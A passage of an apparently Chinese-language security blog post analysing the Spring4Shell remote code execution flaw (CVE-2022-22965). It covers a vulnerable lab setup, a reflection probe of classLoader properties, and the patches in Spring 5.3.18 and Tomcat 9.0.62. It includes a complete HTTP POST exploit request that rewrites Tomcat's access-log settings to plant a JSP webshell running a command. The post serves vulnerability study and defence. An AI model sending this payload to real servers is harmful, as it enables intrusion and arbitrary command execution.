class="hljs-name">relativePath</span>/&gt;</span> <span class="hljs-comment">&lt;!-- lookup parent from repository --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">java.version</span>&gt;</span>11<span class="hljs-tag">&lt;/<span class="hljs-name">java.version</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--把spring-beans修改为有漏洞的版本--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">spring-beans.version</span>&gt;</span>5.3.17<span class="hljs-tag">&lt;/<span class="hljs-name">spring-beans.version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>同时更改 idea 项目结构中的 jdk</p>
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250510203140332.png" srcset="/img/loading.gif" lazyload alt="image-20250510203140332" style="zoom:67%;" />
+
+<p>然后把 User 和 UserController 加入进来</p>
+<p><strong>User</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.spring;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br><br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br><br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>UserController</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.spring;<br><br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserContorller</span> &#123;<br>    <span class="hljs-meta">@RequestMapping(&quot;/adduser&quot;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">addUser</span><span class="hljs-params">(User user)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>最终的项目结构</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250510203048697.png" srcset="/img/loading.gif" lazyload alt="image-20250510203048697"></p>
+<p>打包一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mvn package<br></code></pre></td></tr></table></figure>
+
+<p>把 taget 里的 war 包复制到 tomcat 的 webapps 目录下，启动 tomcat 就好了</p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们可以创建一个 controller，看一下 Class.Module.ClassLoader 有哪些属性</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.spring4shell.controller;<br><br><span class="hljs-keyword">import</span> com.lingx5.spring4shell.entry.User;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProperController</span> &#123;<br>    <span class="hljs-meta">@RequestMapping(&quot;/testclass&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">classTest</span><span class="hljs-params">()</span>&#123;<br>        HashSet&lt;Object&gt; set = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;Object&gt;();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;class.moduls.classLoader&quot;</span>;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">action</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>        processClass(action.getClass().getClassLoader(),set,poc);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processClass</span><span class="hljs-params">(Object instance, java.util.HashSet set, String poc)</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class&lt;?&gt; c = instance.getClass();<br>            set.add(instance);<br>            Method[] allMethods = c.getMethods();<br>            <span class="hljs-keyword">for</span> (Method m : allMethods) &#123;<br>                <span class="hljs-keyword">if</span> (!m.getName().startsWith(<span class="hljs-string">&quot;set&quot;</span>)) &#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (!m.toGenericString().startsWith(<span class="hljs-string">&quot;public&quot;</span>)) &#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br>                Class&lt;?&gt;[] pType  = m.getParameterTypes();<br>                <span class="hljs-keyword">if</span>(pType.length!=<span class="hljs-number">1</span>) <span class="hljs-keyword">continue</span>;<br>                <span class="hljs-keyword">if</span>(pType[<span class="hljs-number">0</span>].getName().equals(<span class="hljs-string">&quot;java.lang.String&quot;</span>)||<br>                        pType[<span class="hljs-number">0</span>].getName().equals(<span class="hljs-string">&quot;boolean&quot;</span>)||<br>                        pType[<span class="hljs-number">0</span>].getName().equals(<span class="hljs-string">&quot;int&quot;</span>))&#123;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">fieldName</span> <span class="hljs-operator">=</span> m.getName().substring(<span class="hljs-number">3</span>,<span class="hljs-number">4</span>).toLowerCase()+m.getName().substring(<span class="hljs-number">4</span>);<br>                    System.out.println(poc+<span class="hljs-string">&quot;.&quot;</span>+fieldName);<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">for</span> (Method m : allMethods) &#123;<br>                <span class="hljs-keyword">if</span> (!m.getName().startsWith(<span class="hljs-string">&quot;get&quot;</span>)) &#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (!m.toGenericString().startsWith(<span class="hljs-string">&quot;public&quot;</span>)) &#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br>                Class&lt;?&gt;[] pType  = m.getParameterTypes();<br>                <span class="hljs-keyword">if</span>(pType.length!=<span class="hljs-number">0</span>) <span class="hljs-keyword">continue</span>;<br>                <span class="hljs-keyword">if</span>(m.getReturnType() == Void.TYPE) <span class="hljs-keyword">continue</span>;<br>                m.setAccessible(<span class="hljs-literal">true</span>);<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> m.invoke(instance);<br>                <span class="hljs-keyword">if</span>(o!=<span class="hljs-literal">null</span>)<br>                &#123;<br>                    <span class="hljs-keyword">if</span>(set.contains(o)) <span class="hljs-keyword">continue</span>;<br>                    processClass(o, set, poc+<span class="hljs-string">&quot;.&quot;</span>+m.getName().substring(<span class="hljs-number">3</span>,<span class="hljs-number">4</span>).toLowerCase()+m.getName().substring(<span class="hljs-number">4</span>));<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException | InvocationTargetException x) &#123;<br>            x.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>启动项目访问 <code>/testclass</code> </p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250510162639084.png" srcset="/img/loading.gif" lazyload alt="image-20250510162639084"></p>
+<p>发现有 AccessValve 的一些属性</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">class<span class="hljs-selector-class">.module</span><span class="hljs-selector-class">.classLoader</span><span class="hljs-selector-class">.resources</span><span class="hljs-selector-class">.context</span><span class="hljs-selector-class">.parent</span><span class="hljs-selector-class">.pipeline</span><span class="hljs-selector-class">.first</span><span class="hljs-selector-class">.directory</span> <br>class<span class="hljs-selector-class">.module</span><span class="hljs-selector-class">.classLoader</span><span class="hljs-selector-class">.resources</span><span class="hljs-selector-class">.context</span><span class="hljs-selector-class">.parent</span><span class="hljs-selector-class">.pipeline</span><span class="hljs-selector-class">.first</span><span class="hljs-selector-class">.prefix</span> <br>class<span class="hljs-selector-class">.module</span><span class="hljs-selector-class">.classLoader</span><span class="hljs-selector-class">.resources</span><span class="hljs-selector-class">.context</span><span class="hljs-selector-class">.parent</span><span class="hljs-selector-class">.pipeline</span><span class="hljs-selector-class">.first</span><span class="hljs-selector-class">.suffix</span> <br>class<span class="hljs-selector-class">.module</span><span class="hljs-selector-class">.classLoader</span><span class="hljs-selector-class">.resources</span><span class="hljs-selector-class">.context</span><span class="hljs-selector-class">.parent</span><span class="hljs-selector-class">.pipeline</span><span class="hljs-selector-class">.first</span><span class="hljs-selector-class">.pattern</span> <br>class<span class="hljs-selector-class">.module</span><span class="hljs-selector-class">.classLoader</span><span class="hljs-selector-class">.resources</span><span class="hljs-selector-class">.context</span><span class="hljs-selector-class">.parent</span><span class="hljs-selector-class">.pipeline</span><span class="hljs-selector-class">.first</span>.fileDateFormat<br></code></pre></td></tr></table></figure>
+
+<h3 id="AccessLogValve"><a href="#AccessLogValve" class="headerlink" title="AccessLogValve"></a>AccessLogValve</h3><p><code>AccessLogValve</code> 是 Tomcat 中用来记录访问日志的一个“阀门”（Valve）组件。它的主要作用是将 HTTP 请求相关信息（比如客户端 IP、访问时间、请求方法、响应码等）写入到日志文件，这些日志常用于访问统计、性能分析、安全审计等场景。</p>
+<p>在 servlet.xml 中常见的配置如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Host</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;localhost&quot;</span>  <span class="hljs-attr">appBase</span>=<span class="hljs-string">&quot;webapps&quot;</span> <span class="hljs-attr">...</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">Valve</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;org.apache.catalina.valves.AccessLogValve&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">directory</span>=<span class="hljs-string">&quot;logs&quot;</span> </span><br><span class="hljs-tag">         <span class="hljs-attr">prefix</span>=<span class="hljs-string">&quot;localhost_access_log&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">suffix</span>=<span class="hljs-string">&quot;.txt&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">pattern</span>=<span class="hljs-string">&quot;%h %l %u %t <span class="hljs-symbol">&amp;quot;</span>%r<span class="hljs-symbol">&amp;quot;</span> %s %b&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">Host</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>directory：access_log 文件输出目录。</li>
+<li>prefix：access_log 文件名前缀。</li>
+<li>pattern：access_log 文件内容格式。</li>
+<li>suffix：access_log 文件名后缀。</li>
+</ul>
+<p>而我们可以利用 <code>class.module.classloader</code> 设置日志的路径、名称、后缀和内容，这不就相当于是可以写木马了</p>
+<p>可以做如下修改</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">// 指定存放路径为 webapps/ROOT</span><br>class<span class="hljs-selector-class">.module</span><span class="hljs-selector-class">.classLoader</span><span class="hljs-selector-class">.resources</span><span class="hljs-selector-class">.context</span><span class="hljs-selector-class">.parent</span><span class="hljs-selector-class">.pipeline</span><span class="hljs-selector-class">.first</span>.directory=webapps/ROOT<br><span class="hljs-comment">// 指定文件名前缀为shell</span><br>class<span class="hljs-selector-class">.module</span><span class="hljs-selector-class">.classLoader</span><span class="hljs-selector-class">.resources</span><span class="hljs-selector-class">.context</span><span class="hljs-selector-class">.parent</span><span class="hljs-selector-class">.pipeline</span><span class="hljs-selector-class">.first</span>.prefix=shell<br><span class="hljs-comment">// 指定文件名后缀为.jsp</span><br>class<span class="hljs-selector-class">.module</span><span class="hljs-selector-class">.classLoader</span><span class="hljs-selector-class">.resources</span><span class="hljs-selector-class">.context</span><span class="hljs-selector-class">.parent</span><span class="hljs-selector-class">.pipeline</span><span class="hljs-selector-class">.first</span>.suffix=<span class="hljs-selector-class">.jsp</span><br><span class="hljs-comment">// 指定文件内容为 jsp 一句话木马</span><br>class<span class="hljs-selector-class">.module</span><span class="hljs-selector-class">.classLoader</span><span class="hljs-selector-class">.resources</span><span class="hljs-selector-class">.context</span><span class="hljs-selector-class">.parent</span><span class="hljs-selector-class">.pipeline</span><span class="hljs-selector-class">.first</span>.pattern=<span class="hljs-string">&quot;jsp一句话木马&quot;</span><br><span class="hljs-comment">// 指定文件名中间内容为空</span><br>class<span class="hljs-selector-class">.module</span><span class="hljs-selector-class">.classLoader</span><span class="hljs-selector-class">.resources</span><span class="hljs-selector-class">.context</span><span class="hljs-selector-class">.parent</span><span class="hljs-selector-class">.pipeline</span><span class="hljs-selector-class">.first</span>.fileDateFormat=<br></code></pre></td></tr></table></figure>
+
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/spring/adduser</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:8080<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;-Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;102&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">suffix</span><span class="hljs-punctuation">: </span>%&gt;<br><span class="hljs-attribute">prefix</span><span class="hljs-punctuation">: </span>&lt;%<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>460<br><br><span class="language-maxima">class.module.classLoader.resources.<span class="hljs-built_in">context</span>.parent.pipeline.<span class="hljs-built_in">first</span>.pattern=<span class="hljs-symbol">%</span><span class="hljs-number">25</span>&#123;<span class="hljs-built_in">prefix</span>&#125;iRuntime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)%3b%<span class="hljs-number">25</span>&#123;suffix&#125;i&amp;class.module.classLoader.resources.<span class="hljs-built_in">context</span>.parent.pipeline.<span class="hljs-built_in">first</span>.suffix=.jsp&amp;class.module.classLoader.resources.<span class="hljs-built_in">context</span>.parent.pipeline.<span class="hljs-built_in">first</span>.<span class="hljs-built_in">directory</span>=./webapps/ROOT/&amp;class.module.classLoader.resources.<span class="hljs-built_in">context</span>.parent.pipeline.<span class="hljs-built_in">first</span>.<span class="hljs-built_in">prefix</span>=shell&amp;class.module.classLoader.resources.<span class="hljs-built_in">context</span>.parent.pipeline.<span class="hljs-built_in">first</span>.fileDateFormat=</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>注意最后不要有空行</strong> </p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250510203425201.png" srcset="/img/loading.gif" lazyload alt="image-20250510203425201"></p>
+<p>后访问 <code>/shell.jsp</code></p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250510200035518.png" srcset="/img/loading.gif" lazyload alt="image-20250510200035518"></p>
+<blockquote>
+<p>这个漏洞只能在 tomcat 中实现，也就是说必须要 war 包在 tomcat 容器里部署，如果是 springboot 启动的话就不行了。</p>
+<p>这主要是因为 ClassLoader 不一样，tomcat中获得的是org.apache.catalina.loader.ParallelWebappClassLoader</p>
+<p>而在springboot中是org.springframework.boot.loader.LaunchedURLClassLoader，它并没有resources成员变量，也没有利用链</p>
+</blockquote>
+<h3 id="POC-说明"><a href="#POC-说明" class="headerlink" title="POC 说明"></a>POC 说明</h3><p><code>%&#123;prefix&#125;i</code> 的形式是官方规定的 AccessLogValve 可以从请求体中获取信息的表达式。官方文档说明如下 <a target="_blank" rel="noopener" href="https://tomcat.apache.org/tomcat-8.5-doc/api/org/apache/catalina/valves/AbstractAccessLogValve.html">https://tomcat.apache.org/tomcat-8.5-doc/api/org/apache/catalina/valves/AbstractAccessLogValve.html</a></p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250510210406146.png" srcset="/img/loading.gif" lazyload alt="image-20250510210406146"></p>
+<h3 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><h4 id="spring-5-3-18"><a href="#spring-5-3-18" class="headerlink" title="spring 5.3.18"></a>spring 5.3.18</h4><p>同样是在 CachedIntrospectionResults 做了更加严格的限制</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/spring-projects/spring-framework/compare/v5.3.17...v5.3.18">Comparing v5.3.17…v5.3.18 · spring-projects&#x2F;spring-framework</a></p>
+<p>可以看到当Java Bean的类型为java.lang.Class时，仅允许获取name以及Name后缀的属性描述符。</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250510211637546.png" srcset="/img/loading.gif" lazyload alt="image-20250510211637546"></p>
+<h4 id="tomcat-9-0-62"><a href="#tomcat-9-0-62" class="headerlink" title="tomcat 9.0.62"></a>tomcat 9.0.62</h4><p>getResources()方法的返回值做了修改，直接返回null。获取不到 Resources 自然也无法修改 AccessLogValve 的输出路径。</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1532/">从零开始，分析 Spring Framework RCE - 跳跳糖</a></p>
+<p><a target="_blank" rel="noopener" href="https://snyk.io/blog/spring4shell-zero-day-rce-spring-framework-explained/?loc=learn">Spring4Shell: The zero-day RCE in the Spring Framework explained | Snyk</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/kc7XP3K98c62Z-Euyz1EZA">Spring Beans RCE 分析(附带环境源码)</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzk0NTU5Mjg0Ng==&mid=2247491401&idx=1&sn=e1584f277a529d04946e960a0ca4ec8f&source=41#wechat_redirect">【最新漏洞预警】CVE-2022-22965 Spring 核心框架 Spring4Shell 远程命令执行漏洞原理与修复方式分析</a></p>
+<p><a target="_blank" rel="noopener" href="https://l3yx.github.io/2022/07/21/Spring-Framework-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2010-1622">Spring Framework 代码执行(CVE-2010-1622) | l3yx’s blog</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/10727">spring rce 从 cve-2010-1622 到 CVE-2022-22965 篇一-先知社区</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/272149">Spring远程命令执行漏洞（CVE-2022-22965）原理分析和思考-安全KER - 安全资讯平台</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/java%E5%AE%89%E5%85%A8/" class="category-chain-item">java安全</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/java%E5%AE%89%E5%85%A8/Spring/" class="category-chain-item">Spring</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/java%E5%AE%89%E5%85%A8/" class="print-no-link">#java安全</a>
+      
+        <a href="/tags/Spring/" class="print-no-link">#Spring</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Spring4Shell漏洞分析</div>
+      <div>http://lingx5.github.io/2025/05/10/Spring4Shell漏洞分析/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>lingx5</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年5月10日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/04/26/shiro-%E5%86%85%E5%AD%98%E9%A9%AC/" title="shiro 内存马">
+                        <span class="hidden-mobile">shiro 内存马</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
